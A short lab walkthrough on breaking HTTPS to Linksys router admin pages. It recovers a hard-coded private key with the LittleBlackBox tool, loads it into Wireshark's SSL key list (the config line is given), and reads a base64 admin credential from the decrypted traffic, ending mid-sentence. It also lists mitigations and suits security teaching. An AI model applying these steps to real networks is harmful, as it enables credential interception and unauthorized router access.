=== 7030 Linksys SSL Break


Problem: Many routers that provide an HTTPS administrative interface use default or hard-coded SSL keys that can be recovered by extracting the file system from the device's firmware.

The LittleBlackBox project contains a database of over 2,000 (and growing) private SSL keys that are correlated with their respective public certificates, and hardware/firmware versions. While most of these certificates are from DD-WRT firmware, there are also private keys from other vendors including Cisco, Linksys, D-Link and Netgear.

Mitigation: Force to change default SSL keys. Change hardcoded mechanism to put ssl passwords.

1. We use the littleblackbox tool to obtain private key and a way to decipher SSL pcap traffic obtaining username:password in (b64) cleartext. We have passed two arguments to the tool, 1. the capture file, 2 the fingerprint. This tool has a db to compare.

2. Open wireshark and edit in the preferences 'Protocols' -> 'SSL'
Add RSA key List section: 192.168.200.242,443,http,/home/hacker/linksys.pem

We add our private key generate as a pem with this format: ip,port,protocol, cert

3. Instantly we can view decipher SSL traffic and obtain our key in the HTTP conversation that gave us the access to the router: OjEzMzdwYXNzd29yZA== in base64 decodes as:
